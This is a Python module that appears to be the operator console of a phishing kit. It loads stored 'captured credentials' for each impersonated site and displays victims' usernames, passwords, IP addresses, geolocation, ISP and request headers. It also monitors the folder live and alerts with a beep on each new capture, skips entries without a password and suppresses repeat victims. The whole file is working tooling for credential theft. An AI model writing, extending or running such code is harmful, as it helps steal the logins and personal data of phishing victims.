import os

import time

import json

from utils import CREDENTIALS_DIR, RESET, extract_timestamp_from_filename, get_credential_files



class Color:

    HEADER = '\033[95m'                 

    BLUE = '\033[94m'

    CYAN = '\033[96m'

    GREEN = '\033[92m'

    YELLOW = '\033[93m'

    RED = '\033[91m'

    BOLD = '\033[1m'

    UNDERLINE = '\033[4m'

    RESET = '\033[0m'



def format_value(key, value):

    """Returns a tuple (icon, color, formatted_value) based on key content"""

    k_lower = str(key).lower()

    val_str = str(value)

    

    if 'pass' in k_lower or 'encpass' in k_lower:

        return "🔑", Color.RED, val_str

    elif 'user' in k_lower or 'email' in k_lower or 'login' in k_lower:

        return "👤", Color.CYAN, val_str

    elif 'ip' in k_lower:

        return "💻", Color.BOLD, val_str

    elif 'url' in k_lower or 'host' in k_lower or 'referer' in k_lower:

        return "🔗", Color.RESET, val_str

    elif 'agent' in k_lower:

        return "📱", Color.RESET, val_str

    elif 'country' in k_lower:

        return "🏳️ ", Color.RESET, val_str

    elif 'city' in k_lower:

        return "🏙️ ", Color.RESET, val_str

    elif 'lat' in k_lower or 'lon' in k_lower:

        return "📍", Color.RESET, val_str

    elif 'isp' in k_lower:

        return "🏢", Color.RESET, val_str

    

    return "🔹", Color.RESET, val_str



def print_category(category_name, category_icon, data_dict, is_last_category):

    """Prints a whole branch of the tree"""

    if not data_dict:

        return



    branch_char = "└──" if is_last_category else "├──"

    print(f"{Color.BLUE}{branch_char}{Color.RESET} {category_icon} {Color.YELLOW}{category_name}{Color.RESET}")



    child_prefix = "    " if is_last_category else "│   "



    items = list(data_dict.items())

    for i, (key, value) in enumerate(items):

        is_last_item = (i == len(items) - 1)

        item_branch = "└──" if is_last_item else "├──"

        

        icon, val_color, fmt_val = format_value(key, value)

        

        display_key = str(key).replace('_', ' ').title()

        

        print(f"{Color.BLUE}{child_prefix}{item_branch}{Color.RESET} {icon} {display_key}: {val_color}{fmt_val}{Color.RESET}")



def extract_username_from_entry(entry):

    """Extract username from credential entry for deduplication"""

    raw_data = entry.get('data', {})

    

    if isinstance(raw_data, dict):

                                                           

        for key in ['email', 'username', 'user', 'login', 'user_id']:

            if key in raw_data and raw_data[key]:

                return str(raw_data[key]).strip().lower()

    

                            

    client_info = entry.get('client_info', {})

    if client_info and 'ip' in client_info:

        return client_info['ip']

    

    return "unknown"



def has_meaningful_credentials(entry):

    """Check if entry contains meaningful credentials (not just partial data)"""

    raw_data = entry.get('data', {})

    

    if not isinstance(raw_data, dict):

        return False

    

                              

    has_username = False

    for key in ['email', 'username', 'user', 'login']:

        if key in raw_data and raw_data[key] and str(raw_data[key]).strip():

            has_username = True

            break

    

                        

    has_password = False

    for key in ['pass', 'password', 'encpass', 'passwd']:

        if key in raw_data and raw_data[key] and str(raw_data[key]).strip():

            has_password = True

            break

    

                                                           

    return has_username and has_password



def display_single_credential(entry, filename=""):

    """Display a single credential entry"""

    if filename:

        print(f"\n{Color.CYAN}📁 File: {filename}{Color.RESET}")

    

    timestamp = entry.get('timestamp', 'N/A')

    

    print(f"{Color.GREEN}📦 NEW CREDENTIAL CAPTURED!{Color.RESET}")

    print(f"{Color.BLUE}├──{Color.RESET} 🕒 {Color.BOLD}Time:{Color.RESET} {timestamp}")



    raw_data = entry.get('data', {})

    form_data = {}

    

    if isinstance(raw_data, dict):

        if 'form_data' in raw_data:

            form_data = raw_data.get('form_data', {})

                                          

            for k, v in raw_data.items():

                if k not in ['form_data', 'client_env'] and isinstance(v, (str, int, float, bool)):

                    form_data[k] = v

        else:

            form_data = raw_data

    

    client_info = entry.get('client_info', {})

    if not client_info and 'meta' in entry:

        client_info = entry.get('meta', {})

    

    geo_data = {}

    headers_data = {}

    client_env_data = {}

    network_data = {}

    

    if isinstance(raw_data, dict) and 'client_env' in raw_data:

         client_env_data = raw_data['client_env']

    

    for k, v in client_info.items():

        if k == 'geo' and isinstance(v, dict):

            geo_data = v

        elif k == 'headers' and isinstance(v, dict):

            headers_data = v

        elif k == 'client_env' and isinstance(v, dict):

            client_env_data = v

        elif isinstance(v, dict):

            network_data[k] = str(v)

        else:

            network_data[k] = v



    categories = []

    

    if form_data:

        categories.append({"name": "Credentials", "icon": "🔐", "data": form_data})

    if geo_data:

        categories.append({"name": "Geo-Location", "icon": "🌍", "data": geo_data})

    if network_data:

        categories.append({"name": "Network & Device", "icon": "📡", "data": network_data})

    if client_env_data:

        categories.append({"name": "Client Environment", "icon": "🖥️ ", "data": client_env_data})

    if headers_data:

        categories.append({"name": "HTTP Headers", "icon": "📨", "data": headers_data})



    for idx, cat in enumerate(categories):

        is_last = (idx == len(categories) - 1)

        print_category(cat['name'], cat['icon'], cat['data'], is_last)

    

    print("")                          



def print_recent_credentials(site_name, count=5):

    """Print recent credentials for manual viewing"""

    site_dir = os.path.join(CREDENTIALS_DIR, site_name)

    

    if not os.path.exists(site_dir):

        print(f"{Color.YELLOW}No credentials found for {site_name}{Color.RESET}")

        return

    

                              

    credential_files = get_credential_files(site_name)

    

    if not credential_files:

        print(f"{Color.YELLOW}No credential files found for {site_name}{Color.RESET}")

        return

    

    print(f"\n{Color.HEADER}{Color.BOLD}🌳 Recent Captured Credentials for {site_name}:{Color.RESET}\n")

    

                            

    recent_files = credential_files[:count]

    

    for i, filename in enumerate(recent_files, 1):

        cred_file = os.path.join(site_dir, filename)

        try:

            with open(cred_file, 'r', encoding='utf-8') as f:

                entry = json.load(f)

            

            print(f"{Color.GREEN}📦 Entry #{i}{Color.RESET}")

            display_single_credential(entry, filename)

            

        except Exception as e:

            print(f"{Color.RED}Error reading {filename}: {e}{Color.RESET}")



def monitor_credentials(site_name):

    site_dir = os.path.join(CREDENTIALS_DIR, site_name)

    

    if not os.path.exists(site_dir):

        os.makedirs(site_dir, exist_ok=True)

    

    print(f"\n{Color.BOLD}{Color.BLUE}🔍 Monitoring for NEW credentials... (Ctrl+C to stop){Color.RESET}")

    print(f"{Color.YELLOW}Note: Only credentials captured AFTER this point will be shown{Color.RESET}")

    

                                           

    existing_files_at_startup = set()

    if os.path.exists(site_dir):

        for f in os.listdir(site_dir):

            if f.endswith('.json') and f.startswith(site_name + '_') and not f.startswith('index'):

                existing_files_at_startup.add(f)

    

                                                                       

    displayed_usernames = {}

                                         

    processed_files = set()

    

                                         

    startup_time = time.time()

    

    try:

        while True:

                               

            current_files = set()

            if os.path.exists(site_dir):

                for f in os.listdir(site_dir):

                    if f.endswith('.json') and f.startswith(site_name + '_') and not f.startswith('index'):

                        current_files.add(f)

            

                                                                                    

            new_files = current_files - existing_files_at_startup - processed_files

            

            if new_files:

                                                            

                sorted_new_files = sorted(

                    list(new_files), 

                    key=lambda x: extract_timestamp_from_filename(x), 

                    reverse=True

                )

                

                for filename in sorted_new_files:

                    cred_file = os.path.join(site_dir, filename)

                    

                                                                             

                    try:

                        file_creation_time = os.path.getctime(cred_file)

                        if file_creation_time < startup_time - 2:                   

                                                                                   

                            processed_files.add(filename)

                            continue

                    except:

                        pass

                    

                    try:

                        with open(cred_file, 'r', encoding='utf-8') as f:

                            entry = json.load(f)

                        

                                                            

                        username = extract_username_from_entry(entry)

                        

                                                                                           

                        current_time = time.time()

                        if username in displayed_usernames:

                            last_display_time = displayed_usernames[username]

                            if current_time - last_display_time < 30:                      

                                                

                                processed_files.add(filename)

                                continue

                        

                                                                                                   

                        if not has_meaningful_credentials(entry):

                                                                 

                            processed_files.add(filename)

                            continue

                        

                                                     

                        display_single_credential(entry, filename)

                        

                                           

                        displayed_usernames[username] = current_time

                        processed_files.add(filename)

                        

                                                 

                        try:

                            import winsound

                            winsound.Beep(1000, 300)

                        except:

                            pass

                            

                    except Exception as e:

                        print(f"{Color.RED}Error reading {filename}: {e}{Color.RESET}")

                        processed_files.add(filename)

            

                                                                     

            current_time = time.time()

            old_usernames = []

            for username, display_time in displayed_usernames.items():

                if current_time - display_time > 300:             

                    old_usernames.append(username)

            

            for username in old_usernames:

                del displayed_usernames[username]

            

            time.sleep(1)                      

            

    except KeyboardInterrupt:

        print(f"\n{Color.YELLOW}⏹️  Monitoring stopped.{Color.RESET}")

                      

        if os.path.exists(site_dir):

            total_files = len([f for f in os.listdir(site_dir) 

                             if f.endswith('.json') and f.startswith(site_name + '_') and not f.startswith('index')])

            print(f"{Color.CYAN}📊 Total credentials for {site_name}: {total_files}{Color.RESET}")

            print(f"{Color.CYAN}👤 Unique users displayed: {len(displayed_usernames)}{Color.RESET}")

